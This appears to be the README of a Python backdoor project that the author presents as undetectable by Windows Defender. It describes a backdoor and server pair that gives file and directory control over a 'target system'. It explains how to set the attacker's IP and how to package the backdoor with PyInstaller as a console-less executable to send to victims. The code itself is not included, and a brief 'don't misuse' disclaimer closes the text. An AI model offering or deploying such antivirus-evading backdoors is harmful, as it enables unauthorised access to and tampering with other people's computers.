# DEFENDER-PAYLOAD
This is a hacking tool i created with python and its undetectable by the windows defender, it can perform various things inside the target system like downloading file, removing file, making directories, deleting directories and so on...

YOU JUST HAVE TO CHANGE THE IP ADDRESS IN BOTH THE BACKDOOR.PY AND SERVER.PY FILES , Make sure to enter the host server ip address in both the files before running the code.

I will suggest to use PyInstaller for backdoor.py to make whole code as a single package application before sending to the target system.

#For using the PyInstaller first open terminal of your computer:
      1)pip install PyInstaller
      2)python -m PyInstaller --onefile --noconsole backdoor.py


It's my humble request to not use this for personal benefits.This project is basically for knowledge purpose and testing our skills.
DON'T MISUSE IT!
I will keep updating it with time...!
